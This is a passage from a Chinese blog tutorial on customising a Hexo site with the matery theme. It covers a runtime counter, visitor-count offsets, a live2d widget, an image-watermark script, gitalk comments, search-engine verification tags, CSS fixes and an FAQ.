class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure><p>这时在文章里写数学公式基本没有问题了，但是要注意：<br><strong>数学公式中如果出现了连续两个{，中间一定要加空格！</strong></p><h2 id="增加建站时间"><a class="header-anchor" href="#增加建站时间"></a>增加建站时间</h2><p>修改<code>/themes/matery/layout/_partial/footer.ejs</code>文件，在最后加上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">siteTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">window</span>.setTimeout(<span class="string">"siteTime()"</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">var</span> seconds = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">var</span> minutes = seconds * <span class="number">60</span>;</span><br><span class="line">        <span class="keyword">var</span> hours = minutes * <span class="number">60</span>;</span><br><span class="line">        <span class="keyword">var</span> days = hours * <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">var</span> years = days * <span class="number">365</span>;</span><br><span class="line">        <span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        <span class="keyword">var</span> todayYear = today.getFullYear();</span><br><span class="line">        <span class="keyword">var</span> todayMonth = today.getMonth() + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">var</span> todayDate = today.getDate();</span><br><span class="line">        <span class="keyword">var</span> todayHour = today.getHours();</span><br><span class="line">        <span class="keyword">var</span> todayMinute = today.getMinutes();</span><br><span class="line">        <span class="keyword">var</span> todaySecond = today.getSeconds();</span><br><span class="line">        <span class="comment">/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)</span></span><br><span class="line"><span class="comment">        year - 作为date对象的年份，为4位年份值</span></span><br><span class="line"><span class="comment">        month - 0-11之间的整数，做为date对象的月份</span></span><br><span class="line"><span class="comment">        day - 1-31之间的整数，做为date对象的天数</span></span><br><span class="line"><span class="comment">        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数</span></span><br><span class="line"><span class="comment">        minutes - 0-59之间的整数，做为date对象的分钟数</span></span><br><span class="line"><span class="comment">        seconds - 0-59之间的整数，做为date对象的秒数</span></span><br><span class="line"><span class="comment">        microseconds - 0-999之间的整数，做为date对象的毫秒数 */</span></span><br><span class="line">        <span class="keyword">var</span> t1 = <span class="built_in">Date</span>.UTC(<span class="number">2017</span>, <span class="number">09</span>, <span class="number">11</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">00</span>); <span class="comment">//北京时间2018-2-13 00:00:00</span></span><br><span class="line">        <span class="keyword">var</span> t2 = <span class="built_in">Date</span>.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);</span><br><span class="line">        <span class="keyword">var</span> diff = t2 - t1;</span><br><span class="line">        <span class="keyword">var</span> diffYears = <span class="built_in">Math</span>.floor(diff / years);</span><br><span class="line">        <span class="keyword">var</span> diffDays = <span class="built_in">Math</span>.floor((diff / days) - diffYears * <span class="number">365</span>);</span><br><span class="line">        <span class="keyword">var</span> diffHours = <span class="built_in">Math</span>.floor((diff - (diffYears * <span class="number">365</span> + diffDays) * days) / hours);</span><br><span class="line">        <span class="keyword">var</span> diffMinutes = <span class="built_in">Math</span>.floor((diff - (diffYears * <span class="number">365</span> + diffDays) * days - diffHours * hours) / minutes);</span><br><span class="line">        <span class="keyword">var</span> diffSeconds = <span class="built_in">Math</span>.floor((diff - (diffYears * <span class="number">365</span> + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"sitetime"</span>).innerHTML = <span class="string">"本站已运行 "</span> +diffYears+<span class="string">" 年 "</span>+diffDays + <span class="string">" 天 "</span> + diffHours + <span class="string">" 小时 "</span> + diffMinutes + <span class="string">" 分钟 "</span> + diffSeconds + <span class="string">" 秒"</span>;</span><br><span class="line">    &#125;<span class="comment">/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/</span></span><br><span class="line">    siteTime();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>然后在合适的地方（比如copyright声明后面）加上下面的代码就行了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"sitetime"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="修改不蒜子初始化计数"><a class="header-anchor" href="#修改不蒜子初始化计数"></a>修改不蒜子初始化计数</h2><p>因为不蒜子至今未开放注册，所以没办法在官网修改初始化，只能自己动手了。和上一条一样，在<code>/themes/matery/layout/_partial/footer.ejs</code>文件最后加上：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> int = setInterval(fixCount, <span class="number">50</span>);  <span class="comment">// 50ms周期检测函数</span></span><br><span class="line">        <span class="keyword">var</span> pvcountOffset = <span class="number">80000</span>;  <span class="comment">// 初始化首次数据</span></span><br><span class="line">        <span class="keyword">var</span> uvcountOffset = <span class="number">20000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">fixCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">document</span>.getElementById(<span class="string">"busuanzi_container_site_pv"</span>).style.display != <span class="string">"none"</span>) &#123;</span><br><span class="line">                $(<span class="string">"#busuanzi_value_site_pv"</span>).html(<span class="built_in">parseInt</span>($(<span class="string">"#busuanzi_value_site_pv"</span>).html()) + pvcountOffset);</span><br><span class="line">                clearInterval(int);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($(<span class="string">"#busuanzi_container_site_pv"</span>).css(<span class="string">"display"</span>) != <span class="string">"none"</span>) &#123;</span><br><span class="line">                $(<span class="string">"#busuanzi_value_site_uv"</span>).html(<span class="built_in">parseInt</span>($(<span class="string">"#busuanzi_value_site_uv"</span>).html()) + uvcountOffset); <span class="comment">// 加上初始数据 </span></span><br><span class="line">                clearInterval(int); <span class="comment">// 停止检测</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>然后把上面几行有段代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.busuanziStatistics</span> &amp;&amp; <span class="attr">theme.busuanziStatistics.totalTraffic</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-heart-o"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">        本站总访问量 <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span> <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.busuanziStatistics</span> &amp;&amp; <span class="attr">theme.busuanziStatistics.totalNumberOfvisitors</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span>&gt;</span></span><br><span class="line">        人次,<span class="symbol">&amp;nbsp;</span>访客数 <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span> <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> 人.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.busuanziStatistics</span> &amp;&amp; <span class="attr">theme.busuanziStatistics.totalTraffic</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-heart-o"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">        本站总访问量 <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span> <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.busuanziStatistics</span> &amp;&amp; <span class="attr">theme.busuanziStatistics.totalNumberOfvisitors</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line">        人次,<span class="symbol">&amp;nbsp;</span>访客数 <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span> <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> 人.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br></pre></td></tr></table></figure><p>其实就是增加了两个<code>style='display:none'</code>而已。</p><h2 id="添加动漫人物"><a class="header-anchor" href="#添加动漫人物"></a>添加动漫人物</h2><p>其实三步就行了，不用像网上有些教程那么复杂。</p><p><strong>第一步：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p><strong>第二步：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-shizuku</span><br></pre></td></tr></table></figure><p><strong>第三步：</strong><br>在根目录配置文件中添加如下代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  scriptFrom: local</span><br><span class="line">  pluginRootPath: live2dw/</span><br><span class="line">  pluginJsPath: lib/</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  tagMode: false</span><br><span class="line">  log: false</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-shizuku</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: true</span><br><span class="line">  react:</span><br><span class="line">    opacity: 0.7</span><br></pre></td></tr></table></figure><p>然后<code>hexo g</code>再<code>hexo s</code>就能预览出效果了，但是有个注意的地方，我发现<strong>这个动漫人物最好不要和不蒜子同时使用</strong>，不然不蒜子会显示不出来。</p><h2 id="图片添加水印"><a class="header-anchor" href="#图片添加水印"></a>图片添加水印</h2><p>为了防止别人抄袭你文章，可以把所有的图片都加上水印，方法很简单。</p><p>首先在博客根目录下新建一个<code>watermark.py</code>，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">watermark</span><span class="params">(post_name)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> post_name == <span class="string">'all'</span>:</span><br><span class="line">        post_name = <span class="string">'*'</span></span><br><span class="line">    dir_name = <span class="string">'source/_posts/'</span> + post_name + <span class="string">'/*'</span></span><br><span class="line">    <span class="keyword">for</span> files <span class="keyword">in</span> glob.glob(dir_name):</span><br><span class="line">        im = Image.open(files)</span><br><span class="line">        <span class="keyword">if</span> len(im.getbands()) &lt; <span class="number">3</span>:</span><br><span class="line">            im = im.convert(<span class="string">'RGB'</span>)</span><br><span class="line">            print(files)</span><br><span class="line">        font = ImageFont.truetype(<span class="string">'STSONG.TTF'</span>, max(<span class="number">30</span>, int(im.size[<span class="number">1</span>] / <span class="number">20</span>)))</span><br><span class="line">        draw = ImageDraw.Draw(im)</span><br><span class="line">        draw.text((im.size[<span class="number">0</span>] / <span class="number">2</span>, im.size[<span class="number">1</span>] / <span class="number">2</span>),</span><br><span class="line">                  <span class="string">u'@yourname'</span>, fill=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), font=font)</span><br><span class="line">        im.save(files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        watermark(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[usage] &lt;input&gt;'</span>)</span><br></pre></td></tr></table></figure><p>字体也放根目录下，自己找字体。然后每次写完一篇文章可以运行<code>python3 watermark.py postname</code>添加水印，如果第一次运行要给所有文章添加水印，可以运行<code>python3 watermark.py all</code>。</p><h2 id="添加评论插件"><a class="header-anchor" href="#添加评论插件"></a>添加评论插件</h2><p>主题已经自带了gitalk插件了，所以你只需要去github官网配置好就行了。</p><p>首先打开<a href="https://github.com/settings/applications/new" target="_blank" rel="noopener">github</a>申请一个应用，要填四个东西：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Application name &#x2F;&#x2F;应用名称，随便填</span><br><span class="line">Homepage URL &#x2F;&#x2F;填自己的博客地址</span><br><span class="line">Application description &#x2F;&#x2F;应用描述，随便填</span><br><span class="line">Authorization callback URL &#x2F;&#x2F;填自己的博客地址</span><br></pre></td></tr></table></figure><p>然后点击注册，会出现两个字符串<code>Client ID</code>和<code>Client Secret</code>，这个要复制出来。</p><p>然后去主题的配置文件<code>_config.yml</code>下修改<code>gitalk</code>那里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gitalk:</span><br><span class="line">  enable: true</span><br><span class="line">  owner: 你的github用户名</span><br><span class="line">  repo: 你的github用户名.github.io</span><br><span class="line">  oauth:</span><br><span class="line">    clientId: 粘贴刚刚注册完显示的字符串</span><br><span class="line">    clientSecret: 粘贴刚刚注册完显示的字符串</span><br><span class="line">  admin: 你的github用户名</span><br></pre></td></tr></table></figure><p>以后写文章的时候，只要在文章页面登陆过github，就会自动创建评论框，<strong>记得每次写完文章后打开博客文章页面一下</strong>。</p><h2 id="添加百度统计和谷歌统计代码"><a class="header-anchor" href="#添加百度统计和谷歌统计代码"></a>添加百度统计和谷歌统计代码</h2><p>首先打开<a href="https://ziyuan.baidu.com/site/index" target="_blank" rel="noopener">百度站长平台</a>，然后点击添加网站，输入网址并选择领域。</p><p>接下来要验证网站所有权，有三种方式，推荐采用HTML标签验证，最简单，将代码复制出来。</p><p>打开<code>themes/matery/layout/_partial/head.ejs</code>，修改下面两行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"baidu-site-verification"</span> <span class="attr">content</span>=<span class="string">"xxx"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"google-site-verification"</span> <span class="attr">content</span>=<span class="string">"xxx"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>content</code>内容改成你自己刚刚复制出来的就行了。</p><h2 id="修复代码块行号不显示bug"><a class="header-anchor" href="#修复代码块行号不显示bug"></a>修复代码块行号不显示bug</h2><p>修改<code>themes/matery/source/css/matery.css</code>第95行左右的<code>pre</code>和<code>code</code>两段改为如下代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">pre</span> &#123;</span><br><span class="line">    <span class="comment">/* padding: 1.5rem !important; */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">1.5rem</span> <span class="number">1.5rem</span> <span class="number">1.5rem</span> <span class="number">3.3rem</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">1rem</span> <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#272822</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: auto;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">0.35rem</span>;</span><br><span class="line">    <span class="attribute">tab-size</span>: <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">code</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">1px</span> <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: Inconsolata, Monaco, Consolas, <span class="string">'Courier New'</span>, Courier, monospace;</span><br><span class="line">    <span class="comment">/* font-size: 0.91rem; */</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#e96900</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f8f8f8</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在根目录的<code>_config.yml</code>中设置<code>prism_plugin.line_number</code>为<code>true</code>。</p><h2 id="优化文章url路径"><a class="header-anchor" href="#优化文章url路径"></a>优化文章url路径</h2><p>有教程认为，将博客目录结构改为如下，就能减少层级，有利于搜索引擎的SEO。其实不然，网站内容的层级是按照从首页开始点击几次能到达你的文章来算的，所以你改不改都是两层就到达了，不在首页的也可以通过<code>index-archives-post</code>到达，跟文章url长度没有任何关系，所以如下操作作废，你想改也行，不改也行。但是建议已经建站一段时间的同学千万别改，不然会产生很多死链，并且评论issue全部会清空，很麻烦。</p><p><s>seo搜索引擎优化认为，网站的最佳结构是用户从首页点击三次就可以到达任何一个页面，但是我们使用hexo编译的站点打开文章的url是：<code>sitename/year/mounth/day/title</code>四层的结构，这样的url结构很不利于seo，爬虫就会经常爬不到我们的文章，于是，我们可以将url直接改成<code>sitename/title</code>的形式，并且title最好是用英文，在根目录的<code>_config.yml</code>文件下修改permalink如下：</s></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;</span><br><span class="line">permalink: :title&#x2F;</span><br></pre></td></tr></table></figure><h1>常见问题及解答（FAQ）</h1><p>这个章节主要更新许多同学在搭建博客的过程中咨询我的一些问题。</p><h2 id="为什么本地生成完ssh-key之后没有-ssh文件夹？"><a class="header-anchor" href="#为什么本地生成完ssh-key之后没有-ssh文件夹？"></a>为什么本地生成完ssh key之后没有.ssh文件夹？</h2><p>这是我没有想到会遇到的问题，但是很多人还是遇到了，主要问题就是在输入完<code>ssh-keygen -t rsa -C &quot;792321264@qq.com&quot;</code>之后，很多同学没有按照提示继续输入，而是就这么结束了，然后报错了也没有发现。正确做法是按照提示，一路按回车就行了。</p><h2 id="为什么代码块显示有问题？"><a class="header-anchor" href="#为什么代码块显示有问题？"></a>为什么代码块显示有问题？</h2><p>代码要显示正确，要注意以下几个点：</p><ul><li><p>根目录<code>_config.yml</code>文件下的<code>highlight</code>中的<code>line_number</code>要设置为<code>false</code>，因为行号有bug，当然如果你按照上面教程修复了bug，就可以改成<code>true</code>。</p></li><li><p>不要按照网上教程安装<code>kramed</code>插件，已经装了的卸载掉。</p></li><li><p>修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node_modules&#x2F;marked&#x2F;lib&#x2F;marked.js</span><br></pre></td></tr></table></figure><p>文件中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">em</span><br></pre></td></tr></table></figure><p>两行（在538行左右），改成下面：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure></li></ul><h2 id="为什么博客本地预览没问题，push到github上就显示不正常？"><a class="header-anchor" href="#为什么博客本地预览没问题，push到github上就显示不正常？"></a>为什么博客本地预览没问题，push到github上就显示不正常？</h2><p>这个问题可能原因有很多，我暂时列举遇到的情况：</p><ul><li>github博客的仓库名称一定要和你的github名字完全一样，比如你github名字叫<code>abc</code>，那么仓库名字一定要是<code>abc.github.io</code>。这是大多数人会犯的错误，会导致显示不正常。</li></ul><h2 id="更换主题之后，配置文件是修改根目录下的还是主题目录下的？"><a class="header-anchor" href="#更换主题之后，配置文件是修改根目录下的还是主题目录下的？"></a>更换主题之后，配置文件是修改根目录下的还是主题目录下的？</h2><p>这个其实都要修改，一般也不会出现重复的属性。具体使用哪个，要看主题的源代码，如果是<code>config.xxx</code>那就是用的根目录配置文件，如果是<code>theme.xxx</code>那就用的是主题目录的配置文件。</p><h2 id="在哪建立github分支？"><a class="header-anchor" href="#在哪建立github分支？"></a>在哪建立github分支？</h2><p>点击仓库的<code>settings-branches</code>，右边点击<code>add new branch</code>即可。</p><h2 id="博客目录构成介绍"><a class="header-anchor" href="#博客目录构成介绍"></a>博客目录构成介绍</h2><p>从上图可以看出，博客的目录结构如下：</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>node_modules</span><br><span class="line"><span class="bullet">- </span>public</span><br><span class="line"><span class="bullet">- </span>scaffolds</span><br><span class="line"><span class="bullet">- </span>source</span><br><span class="line"><span class="bullet">    - </span>_posts</span><br><span class="line"><span class="bullet">    - </span>about</span><br><span class="line"><span class="bullet">    - </span>archive</span><br><span class="line"><span class="bullet">    - </span>img</span><br><span class="line"><span class="bullet">    - </span>tags</span><br><span class="line"><span class="bullet">- </span>themes</span><br></pre></td></tr></table></figure><p><code>node_modules</code>是node.js各种库的目录，<code>public</code>是生成的网页文件目录，<code>scaffolds</code>里面就三个文件，存储着新文章和新页面的初始设置，<code>source</code>是我们最常用到的一个目录，里面存放着文章、各类页面、图像等文件，<code>themes</code>存放着主题文件，一般也用不到。</p><p>我们平时写文章只需要关注<code>source/_posts</code>这个文件夹就行了。</p><p>网站图片都保存在<code>D:\study\program\blog\source\img</code>目录下，可以修改成自己的图片。</p><h2 id="修复文档分类bug"><a class="header-anchor" href="#修复文档分类bug"></a>修复文档分类bug</h2><p>这个主题文档分类功能有个bug，一直没有得到解决，直到最近，我才发现是源文件的单词拼错了。。。</p><p>打开<code>D:\study\program\blog\scaffolds\post.md</code>，单词<code>catagories</code>改为<code>categories</code>。</p><h2 id="添加图片放大功能"><a class="header-anchor" href="#添加图片放大功能"></a>添加图片放大功能</h2><p>首先下载<code>zooming.js</code>文件<a href="https://github.com/godweiyang/godweiyang.github.io/blob/master/js/zooming.js" target="_blank" rel="noopener">地址</a>，保存在<code>D:\study\program\blog\themes\beantech\source\js</code>目录下。</p><p>打开<code>D:\study\program\blog\themes\beantech\layout\post.ejs</code>，在最下方粘贴如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/zooming.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后文章里的图片就可以单击全屏啦。</p><h2 id="添加数学公式显示"><a class="header-anchor" href="#添加数学公式显示"></a>添加数学公式显示</h2><p>打开<code>D:\study\program\blog\themes\beantech\layout\post.ejs</code>，在最下方粘贴如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 